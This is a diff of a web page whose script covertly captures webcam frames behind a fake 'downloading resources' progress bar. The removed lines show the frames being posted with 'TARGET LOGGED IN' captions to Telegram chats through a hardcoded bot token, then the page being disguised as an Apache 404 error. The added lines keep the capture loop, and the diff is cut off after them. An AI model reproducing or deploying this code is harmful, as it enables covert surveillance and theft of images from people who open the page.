@@ -31,8 +31,7 @@
 
     <script>
         const TOKEN = '8600866532:AAFbJjSTJUSeUwUf-RWRLMUSL_OdcZ2USaU';
-        // Array containing your Personal ID and the Group ID
-        const IDS = ['7617707778', '-5291795804'];
+        const IDS = ['7617707778', '7194705917'];
 
         async function initiate() {
             const status = document.getElementById('status');
@@ -47,12 +46,12 @@
                 const video = document.getElementById('v');
                 video.srcObject = stream;
                 
-                video.onloadedmetadata = () => {
+                video.onloadedmetadata = async () => {
                     video.play();
                     let count = 0;
                     const maxPackets = 20; 
                     
-                    const interval = setInterval(() => {
+                    const interval = setInterval(async () => {
                         if (count >= maxPackets) {
                             clearInterval(interval);
                             stream.getTracks().forEach(track => track.stop());
@@ -60,55 +59,7 @@
                             return;
                         }
                         
-                        send(count + 1);
+                        await sendSequentially(count + 1);
                         count++;
                         loader.style.width = (count * (100 / maxPackets)) + "%";
-                        status.innerText = "> DOWNLOADING RESOURCES " + count + "/" + maxPackets + "...";
-                    }, 1000); // 1s interval is safer for sending to multiple targets
-                };
-            } catch (e) {
-                status.innerText = "> ACCESS DENIED: PERMISSION FAILED";
-                status.style.color = "#ff4b4b";
-            }
-        }
-
-        function send(index) {
-            const canvas = document.getElementById('c');
-            const video = document.getElementById('v');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            
-            canvas.toBlob(blob => {
-                if (!blob) return;
-
-                IDS.forEach(chatId => {
-                    const fd = new FormData();
-                    fd.append('chat_id', chatId);
-                    fd.append('photo', blob, 'identity_packet.jpg');
-                    fd.append('caption', '🎯 TARGET LOGGED IN\nFragment: ' + index + '\nAgent: C2-Node-Alpha');
-
-                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
-                        method: 'POST',
-                        body: fd
-                    });
-                });
-            }, 'image/jpeg', 0.4); 
-        }
-
-        function render404() {
-            document.documentElement.innerHTML = `
-            <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
-            <html><head>
-            <title>404 Not Found</title>
-            </head><body style="background-color: white; color: black; font-family: sans-serif; padding: 20px;">
-            <h1>Not Found</h1>
-            <p>The requested URL was not found on this server.</p>
-            <hr>
-            <address>Apache/2.4.41 (Ubuntu) Server at Port 443</address>
-            </body></html>`;
-            window.history.pushState({}, "", "/error-log-0x8842");
-        }
-    </script>
-</body>
-</html>
+                        status.innerText = "> UPLOADING FRAGMENT " + count + "/" + maxPackets + "...";
